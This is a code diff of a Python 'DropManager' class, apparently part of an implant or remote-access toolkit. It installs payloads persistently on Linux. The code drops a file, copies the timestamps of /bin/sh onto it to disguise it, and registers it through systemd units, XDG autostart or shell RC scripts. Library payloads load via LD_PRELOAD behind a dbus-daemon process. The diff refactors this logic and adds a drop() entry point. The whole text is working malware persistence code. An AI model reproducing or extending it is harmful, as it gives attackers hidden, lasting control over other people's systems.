@@ -49,11 +49,11 @@ class DropManager(object):
 
     def _check_xdg(self):
         try:
-            self._is_xdg = ( subprocess.check_call(
-                ['xdg-open', '--version'],
-                stdout=self._devnull,
-                stderr=self._devnull
-            ) == 0 )
+            self._is_xdg = (
+                subprocess.check_call(
+                    ['xdg-open', '--version'],
+                    stdout=self._devnull,
+                    stderr=self._devnull) == 0)
 
             self._is_xdg = True
         except (subprocess.CalledProcessError, OSError) as e:
@@ -81,7 +81,7 @@ class DropManager(object):
 
             cmd = cmd + args
 
-            return ( subprocess.check_call(cmd, **penv) == 0 )
+            return (subprocess.check_call(cmd, **penv) == 0)
 
         except (subprocess.CalledProcessError, OSError):
             return None
@@ -129,8 +129,7 @@ class DropManager(object):
         if len(self._rc) == 0:
             self._rc_error = 'No writable known RC scripts found'
 
-    @property
-    def methods(self):
+    def get_methods(self):
         return {
             'xdg': self._is_xdg or self._xdg_error,
             'systemd': self._is_systemd or self._systemd_error,
@@ -139,7 +138,7 @@ class DropManager(object):
         }
 
     def _find_systemd_system_path(self):
-        for d in [ '/lib/systemd/system', '/usr/lib/systemd/system', '/etc/systemd/system' ]:
+        for d in ['/lib/systemd/system', '/usr/lib/systemd/system', '/etc/systemd/system']:
             if os.path.exists(d):
                 return os.path.dirname(d)
 
@@ -235,7 +234,7 @@ class DropManager(object):
                 '%h', self._home
             ).replace(
                 '%r', rand
-            ) for target in ( user_targets if self._user else system_targets )
+            ) for target in (user_targets if self._user else system_targets)
         ]
 
         shstat = os.stat('/bin/sh')
@@ -256,7 +255,7 @@ class DropManager(object):
                     os.utime(target, (shstat.st_atime, shstat.st_ctime))
                     return target
 
-                except Exception as e:
+                except:
                     continue
 
         for target in targets:
@@ -274,8 +273,11 @@ class DropManager(object):
 
     def _is_path_in_file(self, filepath, path):
         if os.path.isfile(filepath):
-            with open(filepath, 'r') as file:
-                return 'path' in filepath
+            with open(filepath, 'r') as f:
+                for line in f:
+                    if path in line:
+                        return True
+
         return False
 
     def _add_to_rc(self, path):
@@ -340,11 +342,11 @@ class DropManager(object):
         if not any([
             self._is_systemd, self._is_xdg, self._rc
         ]):
-            return None, None
+            return None, None, 'Compatible method not found'
 
         dbus_daemon = self._find_executable('dbus-daemon')
         if not dbus_daemon:
-            return None, None
+            return None, None, 'Can not drop file'
 
         path = self._drop_file(payload, lib=True)
         if self._is_systemd:
@@ -361,25 +363,25 @@ class DropManager(object):
                 'LD_PRELOAD={}'.format(path),
                 section='Service',
                 confname=name
-            )
+            ), 'Systemd'
         elif self._is_xdg:
             return path, self._add_to_xdg(
                 'LD_PRELOAD={} HOOK_EXIT=1 {} --session --fork'.format(path, dbus_daemon)
-            )
+            ), 'XDG'
         elif self._rc:
             return path, self._add_to_rc(
                 'LD_PRELOAD={} HOOK_EXIT=1 {} --session --fork'.format(path, dbus_daemon)
-            )
+            ), 'RC'
 
     def add_binary(self, payload, name=None, system=None):
         if not any([
             self._is_systemd, self._is_xdg, self._rc
         ]):
-            return None, None
+            return None, None, 'Compatible method not found'
 
         path = self._drop_file(payload)
         if not path:
-            return None, None
+            return None, None, 'Can not drop file'
 
         if self._is_systemd:
             return path, self._add_systemd_add_to_unit(
@@ -388,10 +390,17 @@ class DropManager(object):
                 '-{}'.format(path),
                 section='Service',
                 confname=name
-            )
+            ), 'Systemd'
 
         elif self._is_xdg:
-            return path, self._add_to_xdg(path)
+            return path, self._add_to_xdg(path), 'XDG'
 
         elif self._rc:
-            return path, self._add_to_rc(path)
+            return path, self._add_to_rc(path), 'RC'
+
+def drop(data, is_library, name=None, system=None):
+    manager = DropManager()
+    if is_library:
+        return manager.add_library(data, name, system)
+    else:
+        return manager.add_binary(data, name, system)
